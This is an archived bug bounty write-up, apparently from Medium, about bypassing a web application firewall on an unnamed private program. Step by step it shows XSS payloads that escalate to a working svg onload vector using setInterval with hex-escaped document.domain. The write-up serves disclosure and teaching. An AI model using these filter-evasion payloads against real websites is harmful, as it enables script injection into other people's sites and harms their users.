---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-12-27_jumping-to-the-hell-with-10-attempts-to-bypass-devils-waf.md
original_filename: 2017-12-27_jumping-to-the-hell-with-10-attempts-to-bypass-devils-waf.md
title: Jumping to the hell with 10 attempts to bypass devil's WAF
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: c67a3b77304504f1190e704b0b9bec72b1ab83ced1c05f415919b9a76d383ab0
text_sha256: 319772a464cc374ba3ba5a204d6433c37756541582a50dfbdaa6205ba9bb793d
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Jumping to the hell with 10 attempts to bypass devil's WAF

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-12-27_jumping-to-the-hell-with-10-attempts-to-bypass-devils-waf.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `c67a3b77304504f1190e704b0b9bec72b1ab83ced1c05f415919b9a76d383ab0`
- Text SHA256: `319772a464cc374ba3ba5a204d6433c37756541582a50dfbdaa6205ba9bb793d`


## Content

---
title: "Jumping to the hell with 10 attempts to bypass devil's WAF"
page_title: "JUMPING TO THE HELL WITH 10 ATTEMPTS TO BYPASS DEVIL’S WAF: | by Ak1T4 | InfoSec Write-ups"
url: "https://medium.com/bugbountywriteup/jumping-to-the-hell-with-10-attempts-to-bypass-devils-waf-4275bfe679dd"
authors: ["Ak1T4 (@akita_zen)"]
bugs: ["XSS"]
publication_date: "2017-12-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6023
scraped_via: "browseros"
---

# Jumping to the hell with 10 attempts to bypass devil's WAF

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

Ak1T4
 highlighted

JUMPING TO THE HELL WITH 10 ATTEMPTS TO BYPASS DEVIL’S WAF:
Ak1T4
Follow
4 min read
·
Dec 28, 2017

539

9

This is a quick write up for a waf bypass on a private bbp, so i will keep hidden the name of the program.

Looking around in the app i found an entry tag feature point which call my attention:

So the app basically load a tag item, i start with this:

### FIRST ATTEMPT:

injection: “=””’><details open=“”>

output is :

<span>”=””’&gt;&lt;details open=””&gt; (0)</span>

Nothing…

### SECOND ATTEMPT

injection: “=””’></><details open=“”>

output is:

<span>”=””’&gt;&lt;/&gt;&lt;details open=””&gt; (0)</span>

Nothing…

### THIRD ATTEMPT:

injection: “=””’></><script></script><details open=“”>

output is :

<span>”=””’&gt;<details open=”…” (0)<=”” span=””><a href=”” class=”” rel=”1"></a></details></span>

bam! we got HTML INJECTION!

NOW … GOING FOR THE PRECIOUS XSS…

#### FOURTH ATTEMPT:

i change the details tag for svg,

injection:“=””’></><script></script><svg onload=alert(1)>

output is :

<span>”=””’&gt;<svg onload=”al…” (1)=””> </svg></span>

strange? yes.. like hell.. with that ugly dots in the DOM too… (tag is working ok like shows above with details tag)

but no popup :(

Get Ak1T4’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

#### FIFTH ATTEMPT:

injection:“=””’></><script></script><svg onload”=”alert(1)>

output is:

<svg onload”=”… (1)> </span><a href=” “=”” class=”” rel=”1"></svg>

WTF? are you kidding me?

Press enter or click to view image in full size
wat?

ok ugly motherfucker… now this is personal..

#### SIXTH ATTEMPT:

injection:“=””’></><script></script><svg onload”=””alertonload=alert(1)””>

output is:

<span>”=””’&gt;<svg onload”=”… (1)” “=””> </svg></span>

ok i give up.. this is not working..

### SEVENTH ATTEMPT:

injection:“ =”” ‘></><script></script><svg onload”=”alertonload=alert(1)”” onload=prompt(1)>

output is:

onload=”prompt</span”><a href=”” class=”” rel=”0"></a></svg></span>

oh nice shit! i’m closer.. i can feel it..

i can fell your energy.. ak1t4..

#### EIGHTH ATTEMPT:

injection:“ =”” ‘></><script></script><svg onload”=”alertonload=alert(1)”” onload=prompt`1`>

output is :

<svg onload”…=”” (1)””=”” onload=”prompt`1`”> </svg> :)

BOOM! WE GOT XSS!

Press enter or click to view image in full size

OK.. NOW TRY WITH document.domain:

#### NINTH ATTEMPT:

injection:“ =”” ‘></><script></script><svg onload”=”alertonload=alert(1)”” onload=prompt`document.domain`>

output is: <svg onload”…=”” (1)””=”” onload=”prompt`document.domain`”> </svg> :(

WTF? sticky shits are taken the input as string…

mmm IS TIME TO CALL A REAL JEDI : MASTER BRUTE COMES TO RESCUE AND BRINGS BALANCE TO THE FORCE..

So i ask him how inject document.domain over sticky shits `1`;

his reply was:

#### FINAL ATTEMPT with the magic touch of master brute :)

injection:“ =”” ‘></><script></script><svg onload”=”alertonload=alert(1)”” onload=setInterval`alert\x28document.domain\x29`

BOOM BABY!

Press enter or click to view image in full size

*THANKS TO MASTER BRUTELOGIC for GUIDE ME TO THE FINAL DESTINY :)

XSS are not my field so i feel like:

May the force be with you — happy hacking :)

P.D: I’m not coder , i hack by common and logical sense. All critics are welcome always for improve. I hope you are enjoyed this lecture as i enjoyed writing.

HackerOne profile — ak1t4
Whiteh4t Hack3r & Zen Monk & bounty hunter — https://twitter.com/knowledge_2014

hackerone.com

ak1t4 z3n (@knowledge_2014) | Twitter
The latest Tweets from ak1t4 z3n (@knowledge_2014). Bug Bounty Hunter — HoF : Google — Mozilla — PayPal — Microsoft …

twitter.com
